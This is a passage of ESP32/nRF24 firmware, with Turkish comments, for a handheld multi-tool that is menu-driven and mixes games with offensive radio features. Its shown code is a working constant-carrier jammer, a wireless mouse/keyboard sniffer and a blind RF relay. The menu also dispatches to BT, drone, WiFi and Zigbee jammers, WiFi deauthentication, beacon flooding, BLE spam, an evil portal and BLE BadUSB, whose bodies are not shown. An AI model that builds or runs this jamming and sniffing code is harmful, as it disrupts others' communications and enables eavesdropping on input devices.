  newFp.name = name;
  newFp.companyId = manufacturerId;
  newFp.lastSeen = millis();
  newFp.lastMac = dev.getAddress().toString().c_str();
  if (mdata.length() > 0 && mdata.length() <= 30) {
    memcpy(newFp.payload, mdata.c_str(), mdata.length());
    newFp.payloadLen = mdata.length();
  } else newFp.payloadLen = 0;
  fingerprints.push_back(newFp);
}

class TrackerCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) { analyzeAdvertisement(dev); }
};

void runBLETracker() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan* pScan = BLEDevice::getScan();
  pScan->setAdvertisedDeviceCallbacks(new TrackerCallbacks());
  pScan->setActiveScan(true);
  pScan->setInterval(100); pScan->setWindow(99);
  fingerprints.clear();
  displayInfo("BLE Tracker", "Scanning...", "SEL to exit");
  pScan->start(0, nullptr, true);
  while (!selPressed()) {
    display.clearDisplay();
    display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
    display.setCursor(0,0); display.print("Devices:");
    int y = 14;
    for (int i=0; i<min(5,(int)fingerprints.size()); i++) {
      String info = fingerprints[i].name + " (" + String(fingerprints[i].companyId,HEX) + ")";
      display.setCursor(0, y); display.print(info);
      y += 10;
    }
    display.display();
    safeDelay(1000);
  }
  pScan->stop();
  BLEDevice::deinit(true);
  initRadios();
}

// ==========================================
// MOUSE/KLAVYE SNIFFER
// ==========================================
void runMouseSniffer() {
  stopRadios();
  radio.setAutoAck(false); radio.setDataRate(RF24_1MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED); radio.setAddressWidth(5);
  const uint8_t addr[5] = {0x12,0x34,0x56,0x78,0x9A};
  for (int i=0; i<6; i++) radio.openReadingPipe(i, addr);
  radio.startListening();
  displayInfo("Mouse Sniffer", "Listening...", "SEL to exit");
  uint8_t packet[32];
  int16_t mouseX = 64, mouseY = 32;
  while (!selPressed()) {
    if (radio.available()) {
      uint8_t len = radio.getDynamicPayloadSize();
      radio.read(&packet, len);
      if (len >= 4) {
        mouseX = constrain(mouseX + (int8_t)packet[1], 0, 127);
        mouseY = constrain(mouseY - (int8_t)packet[2], 0, 63);
      }
      display.clearDisplay();
      display.drawPixel(mouseX, mouseY, SSD1306_WHITE);
      display.drawRect(mouseX-2, mouseY-2, 4, 4, SSD1306_WHITE);
      display.display();
    }
    yield();
  }
  radio.stopListening();
  initRadios();
}

// ==========================================
// RF REPEATER
// ==========================================
void runRFRepeater() {
  stopRadios();
  radio.setAutoAck(false); radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED); radio.setAddressWidth(5);
  radio.openReadingPipe(0, 0xE7E7E7E7E7LL); radio.startListening();
  radio2.setAutoAck(false); radio2.setDataRate(RF24_2MBPS);
  radio2.setCRCLength(RF24_CRC_DISABLED); radio2.setAddressWidth(5);
  radio2.openWritingPipe(0xE7E7E7E7E7LL); radio2.stopListening();
  displayInfo("RF Repeater", "Relay active", "SEL to stop");
  uint8_t buf[32];
  while (!selPressed()) {
    if (radio.available()) {
      uint8_t len = radio.getDynamicPayloadSize();
      radio.read(&buf, len);
      radio2.writeFast(&buf, len);
    }
    yield();
  }
  initRadios();
}

// ==========================================
// RF OSİLOSKOP (128x64)
// ==========================================
void runRFOscilloscope() {
  stopRadios();
  radio2.setAutoAck(false); radio2.startListening();
  int channel = 45, timeScale = 1;
  const int w = 128;
  uint8_t waveform[w]; memset(waveform, 0, w);
  int sampleIdx = 0;
  displayInfo("RF Oscilloscope", "Ch:"+String(channel), "UP/DN:ch/time SEL:exit");
  while (!selPressed()) {
    if (upPressed()) { channel = (channel + 1) % 126; radio2.setChannel(channel); }
    if (downPressed()) { timeScale = (timeScale % 3) + 1; }
    radio2.setChannel(channel);
    delayMicroseconds(timeScale * 100);
    int rpd = 0;
    for (int i=0; i<5; i++) { if (radio2.testRPD()) rpd++; delayMicroseconds(20); }
    waveform[sampleIdx] = map(rpd, 0, 5, 0, 63);
    sampleIdx = (sampleIdx + 1) % w;
    display.clearDisplay();
    for (int x=0; x<w-1; x++) {
      display.drawLine(x, 63 - waveform[(sampleIdx + x) % w],
                       x+1, 63 - waveform[(sampleIdx + x + 1) % w], SSD1306_WHITE);
    }
    display.drawLine(0,0,0,63,SSD1306_WHITE);
    display.setCursor(100,0); display.print(channel);
    display.display();
    yield();
  }
  radio2.stopListening();
  initRadios();
}

// ==========================================
// CW JAMMER
// ==========================================
void runCWJammer() {
  initRadios();
  int freq = 45;
  displayInfo("CW Jammer", "Ch:"+String(freq), "UP/DN chg SEL exit");
  radio.startConstCarrier(RF24_PA_MAX, freq);
  radio2.startConstCarrier(RF24_PA_MAX, freq);
  while (!selPressed()) {
    if (upPressed()) { freq = min(125, freq + 1); radio.setChannel(freq); radio2.setChannel(freq); }
    if (downPressed()) { freq = max(0, freq - 1); radio.setChannel(freq); radio2.setChannel(freq); }
    displayInfo("CW Jammer", "Ch:"+String(freq), "UP/DN chg SEL exit");
    safeDelay(200);
    yield();
  }
  stopRadios();
}

// ==========================================
// TICTACTOE (128x64)
// ==========================================
void runTicTacToe() {
  char board[9] = {'1','2','3','4','5','6','7','8','9'};
  int cursor = 0;
  char player = 'X';
  int moves = 0;
  auto checkWin = [&]() -> char {
    const int wins[8][3] = {{0,1,2},{3,4,5},{6,7,8},{0,3,6},{1,4,7},{2,5,8},{0,4,8},{2,4,6}};
    for(auto& w : wins) if(board[w[0]]==board[w[1]] && board[w[1]]==board[w[2]]) return board[w[0]];
    return ' ';
  };
  while(!selPressed()) {
    display.clearDisplay();
    display.setTextSize(2); display.setTextColor(SSD1306_WHITE);
    display.drawLine(42, 0, 42, 48, SSD1306_WHITE);
    display.drawLine(85, 0, 85, 48, SSD1306_WHITE);
    display.drawLine(0, 16, 128, 16, SSD1306_WHITE);
    display.drawLine(0, 32, 128, 32, SSD1306_WHITE);
    for(int i=0; i<9; i++) {
      int x = (i%3)*43 + 10;
      int y = (i/3)*16 + 2;
      if(i == cursor) {
        display.fillRect(x-2, y-2, 18, 18, SSD1306_WHITE);
        display.setTextColor(SSD1306_BLACK);
      } else display.setTextColor(SSD1306_WHITE);
      display.setCursor(x, y); display.print(String(board[i]));
    }
    char winner = checkWin();
    if(winner != ' ' || moves == 9) {
      display.fillRect(0,50,128,14,SSD1306_BLACK);
      display.setCursor(20,52); display.print(winner!=' ' ? String(winner)+" wins!" : "Draw!");
      display.display(); safeDelay(2000); break;
    }
    display.display();
    if(upPressed()) cursor = (cursor+9-3)%9;
    if(downPressed()) cursor = (cursor+3)%9;
    if(selPressed()) {
      if(board[cursor] != 'X' && board[cursor] != 'O') {
        board[cursor] = player;
        player = (player == 'X') ? 'O' : 'X';
        moves++;
      }
    }
    yield();
  }
  currentState = STATE_MENU; drawMenu();
}

// ==========================================
// PONG (128x64)
// ==========================================
void runPong() {
  int paddleLeft = 24, paddleRight = 24;
  float ballX = 64, ballY = 32, ballDX = 2, ballDY = 1.5;
  int scoreL = 0, scoreR = 0;
  while(!selPressed()) {
    if(upPressed()) paddleLeft = max(0, paddleLeft-3);
    if(downPressed()) paddleLeft = min(48, paddleLeft+3);
    ballX += ballDX; ballY += ballDY;
    if(ballY <= 0 || ballY >= 63) ballDY = -ballDY;
    if(ballX <= 4 && ballY >= paddleLeft && ballY <= paddleLeft+16) ballDX = -ballDX;
    if(ballX >= 124 && ballY >= paddleRight && ballY <= paddleRight+16) ballDX = -ballDX;
    if(ballX < 0) { scoreR++; ballX=64; ballY=32; ballDX=2; }
    if(ballX > 128) { scoreL++; ballX=64; ballY=32; ballDX=-2; }
    if(ballY < paddleRight+8) paddleRight = max(0, paddleRight-2);
    else paddleRight = min(48, paddleRight+2);
    display.clearDisplay();
    display.fillRect(2, paddleLeft, 3, 16, SSD1306_WHITE);
    display.fillRect(123, paddleRight, 3, 16, SSD1306_WHITE);
    display.fillRect(ballX-2, ballY-2, 4, 4, SSD1306_WHITE);
    display.setCursor(50,0); display.print(scoreL); display.print(":"); display.print(scoreR);
    display.display();
    safeDelay(20);
    yield();
  }
  currentState = STATE_MENU; drawMenu();
}

// ==========================================
// AYARLAR & YARDIM
// ==========================================
void showSettings() {
  int sel = 0;
  const char* opts[] = {"Brightness", "LED Test", "Back"};
  while (!selPressed()) {
    display.clearDisplay(); display.setTextSize(1); display.setTextColor(1);
    display.setCursor(0, 0); display.println("Settings");
    for (int i = 0; i < 3; i++) {
      display.setCursor(0, 15 + i * 15);
      if (sel == i) display.print(">"); else display.print(" ");
      display.println(opts[i]);
    }
    display.display();
    if (upPressed()) sel = (sel == 0) ? 2 : sel - 1;
    if (downPressed()) sel = (sel + 1) % 3;
    yield();
  }
  if (sel == 0) {
    uint8_t b = brightness;
    while (!selPressed()) {
      displayInfo("Brightness", String(b), "UP/DOWN");
      if (upPressed()) { b = min(255, b + 10); setBrightness(b); }
      if (downPressed()) { b = max(10, b - 10); setBrightness(b); }
      yield();
    }
  } else if (sel == 1) {
    digitalWrite(LED_PIN, HIGH); safeDelay(500); digitalWrite(LED_PIN, LOW);
  }
  currentState = STATE_MENU; drawMenu();
}

void showHelp() {
  displayInfo("Help v4.1", "UP/DOWN navigate", "SEL select/exit", "BT+WiFi+RF tools", "38 features total");
  safeDelay(4000);
  currentState = STATE_MENU; drawMenu();
}

// ==========================================
// MENÜ YÖNETİMİ (DÜZELTİLDİ)
// ==========================================
void handleMenuSelection() {
  if (upPressed()) {
    if (selectedMenuItem == 0) {
      selectedMenuItem = static_cast<MenuItem>(NUM_MENU_ITEMS - 1);
      firstVisibleMenuItem = NUM_MENU_ITEMS - 4;
    } else {
      selectedMenuItem = static_cast<MenuItem>(selectedMenuItem - 1);
      if (selectedMenuItem < firstVisibleMenuItem) firstVisibleMenuItem = selectedMenuItem;
    }
    drawMenu();
  }
  
  if (downPressed()) {
    selectedMenuItem = static_cast<MenuItem>((selectedMenuItem + 1) % NUM_MENU_ITEMS);
    if (selectedMenuItem == 0) firstVisibleMenuItem = 0;
    else if (selectedMenuItem >= (firstVisibleMenuItem + 4)) firstVisibleMenuItem = selectedMenuItem - 3;
    drawMenu();
  }
  
  if (selPressed()) {
    executeSelectedMenuItem();
  }
}

void executeSelectedMenuItem() {
  switch (selectedMenuItem) {
    case BT_JAM: currentState = STATE_BT_JAM; displayInfo("BT Jammer","Running"); initRadios(); while (!selPressed()) { btJam(); yield(); } currentState = STATE_MENU; drawMenu(); break;
    case DRONE_JAM: currentState = STATE_DRONE_JAM; displayInfo("Drone Jam","Running"); initRadios(); while (!selPressed()) { droneJam(); yield(); } currentState = STATE_MENU; drawMenu(); break;
    case WIFI_JAM: currentState = STATE_WIFI_JAM; displayInfo("WiFi Jam","Running"); initRadios(); while (!selPressed()) { wifiJam(); yield(); } currentState = STATE_MENU; drawMenu(); break;
    case MULTI_JAM: currentState = STATE_MULTI_JAM; displayInfo("Multi Ch","Running"); initRadios(); while (!selPressed()) { singleChannel(); yield(); } currentState = STATE_MENU; drawMenu(); break;
    case SWEEP_JAM: currentState = STATE_SWEEP_JAM; displayInfo("Sweep","Running"); initRadios(); while (!selPressed()) { sweepJam(); yield(); } currentState = STATE_MENU; drawMenu(); break;
    case CHANNEL_RANGE: currentState = STATE_CHANNEL_RANGE; displayInfo("Ch Range","Running"); initRadios(); while (!selPressed()) { channelRange(); yield(); } currentState = STATE_MENU; drawMenu(); break;
    case SPECTRUM_WIFI: currentState = STATE_SPECTRUM_WIFI; runWiFiSpectrum(); currentState = STATE_MENU; drawMenu(); break;
    case SPECTRUM_BLE: currentState = STATE_SPECTRUM_BLE; runBLESpectrum(); currentState = STATE_MENU; drawMenu(); break;
    case BLE_SPAM: currentState = STATE_BLE_SPAM; runBLESpam(); currentState = STATE_MENU; drawMenu(); break;
    case WIFI_DEAUTH: {
      int opt = 0;
      while (!selPressed()) {
        display.clearDisplay(); display.setTextSize(1); display.setTextColor(1);
        display.setCursor(0, 0); display.println("Deauth Options");
        display.setCursor(0, 15); display.print(opt == 0 ? ">" : " "); display.println("Single AP");
        display.setCursor(0, 30); display.print(opt == 1 ? ">" : " "); display.println("All APs");
        display.display();
        if (upPressed()) opt = (opt == 0) ? 1 : 0;
        if (downPressed()) opt = (opt == 0) ? 1 : 0;
        yield();
      }
      if (opt == 0) runWiFiDeauthSingle(); else runWiFiDeauthAll();
      currentState = STATE_MENU; drawMenu(); break;
    }
    case BLE_SCANNER: currentState = STATE_BLE_SCANNER; runBLEScanner(); currentState = STATE_MENU; drawMenu(); break;
    case ZIGBEE_JAM: currentState = STATE_ZIGBEE_JAM; displayInfo("Zigbee","Running"); initRadios(); while (!selPressed()) { zigbeeJam(); yield(); } currentState = STATE_MENU; drawMenu(); break;
    case BLE_TARGET_JAM: currentState = STATE_BLE_TARGET_JAM; runBLETargetJam(); currentState = STATE_MENU; drawMenu(); break;
    case WIFI_BEACON_FLOOD: currentState = STATE_WIFI_BEACON_FLOOD; runWiFiBeaconFlood(); currentState = STATE_MENU; drawMenu(); break;
    case WIFI_ANALYZER: currentState = STATE_WIFI_ANALYZER; runWiFiAnalyzer(); currentState = STATE_MENU; drawMenu(); break;
    case DEAUTH_DETECT: currentState = STATE_DEAUTH_DETECT; runDeauthDetect(); currentState = STATE_MENU; drawMenu(); break;
    case TEST_RADIOS: currentState = STATE_TEST_RADIOS; initRadios(); safeDelay(2000); currentState = STATE_MENU; drawMenu(); break;
    case SETTINGS: showSettings(); break;
    case HELP: showHelp(); break;
    case EVIL_PORTAL: currentState = STATE_EVIL_PORTAL; runEvilPortal(); currentState = STATE_MENU; drawMenu(); break;
    case DOOM_GAME: currentState = STATE_DOOM_GAME; runDOOM(); currentState = STATE_MENU; drawMenu(); break;
    case CALCULATOR: currentState = STATE_CALCULATOR; runCalculator(); currentState = STATE_MENU; drawMenu(); break;
    case RESISTOR_CALC: currentState = STATE_RESISTOR_CALC; runResistorCalc(); currentState = STATE_MENU; drawMenu(); break;
    case WIFI_MONITOR: currentState = STATE_WIFI_MONITOR; runWiFiMonitor(); currentState = STATE_MENU; drawMenu(); break;
    case SNAKE_GAME: currentState = STATE_SNAKE_GAME; runSnakeGame(); currentState = STATE_MENU; drawMenu(); break;
    case PACKET_COUNTER: currentState = STATE_PACKET_COUNTER; runPacketCounter(); currentState = STATE_MENU; drawMenu(); break;
    case WIDS: currentState = STATE_WIDS; runWIDS(); currentState = STATE_MENU; drawMenu(); break;
    case RF_ANALYZER: currentState = STATE_RF_ANALYZER; runRFAnalyzer(); currentState = STATE_MENU; drawMenu(); break;
    case BLE_GATT_EXPLORER: currentState = STATE_BLE_GATT_EXPLORER; runBLEGATTExplorer(); currentState = STATE_MENU; drawMenu(); break;
    case BLE_TRACKER: currentState = STATE_BLE_TRACKER; runBLETracker(); currentState = STATE_MENU; drawMenu(); break;
    case MOUSE_SNIFFER: currentState = STATE_MOUSE_SNIFFER; runMouseSniffer(); currentState = STATE_MENU; drawMenu(); break;
    case RF_REPEATER: currentState = STATE_RF_REPEATER; runRFRepeater(); currentState = STATE_MENU; drawMenu(); break;
    case RF_OSCILLOSCOPE: currentState = STATE_RF_OSCILLOSCOPE; runRFOscilloscope(); currentState = STATE_MENU; drawMenu(); break;
    case BLE_BADUSB: currentState = STATE_BLE_BADUSB; runBLEBadUSB(); currentState = STATE_MENU; drawMenu(); break;
    case WIFI_SNIFFER: currentState = STATE_WIFI_SNIFFER; runWiFiSniffer(); currentState = STATE_MENU; drawMenu(); break;
    case CW_JAMMER: currentState = STATE_CW_JAMMER; runCWJammer(); currentState = STATE_MENU; drawMenu(); break;
    case TICTACTOE: currentState = STATE_TICTACTOE; runTicTacToe(); currentState = STATE_MENU; drawMenu(); break;
    case PONG: currentState = STATE_PONG; runPong(); currentState = STATE_MENU; drawMenu(); break;
    default: break;
  }
}

// ==========================================
// SETUP & LOOP
// ==========================================
void setup() {
  Serial.begin(115200);
  safeDelay(1000);
  Wire.begin(SDA_PIN, SCL_PIN);
  display.begin(SSD1306_SWITCHCAPVCC, SSD1306_I2C_ADDRESS);
  pinMode(UP_BUTTON_PIN, INPUT_PULLUP);
  pinMode(DOWN_BUTTON_PIN, INPUT_PULLUP);
  pinMode(SELECT_BUTTON_PIN, INPUT_PULLUP);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);
  u8g2_for_adafruit_gfx.begin(display);
  setBrightness(brightness);
  splashScreen();
  safeDelay(3000);
  drawMenu();
}

void loop() {
  if (currentState == STATE_MENU) handleMenuSelection();
}
